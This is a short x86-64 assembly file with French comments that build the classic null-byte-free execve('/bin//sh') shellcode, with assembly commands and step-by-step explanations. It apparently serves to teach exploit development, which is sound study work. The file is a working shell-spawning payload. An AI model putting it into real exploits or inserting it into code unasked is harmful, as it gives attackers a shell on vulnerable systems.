; shell.asm : shellcode classique execve("/bin//sh", NULL, NULL)
; Assemblage : nasm -f elf64 shell.asm -o shell.o && ld shell.o -o shell
section .text
    global _start
_start:
    xor esi, esi                ; argv = NULL
    push rsi                    ; 8 octets nuls : la fin de la chaîne
    mov rdi, 0x68732f2f6e69622f ; "/bin//sh" : le double / donne 8 octets sans nul
    push rdi
    mov rdi, rsp                ; rdi = adresse de "/bin//sh"
    xor edx, edx                ; envp = NULL
    push 59
    pop rax                     ; numéro d'execve
    syscall
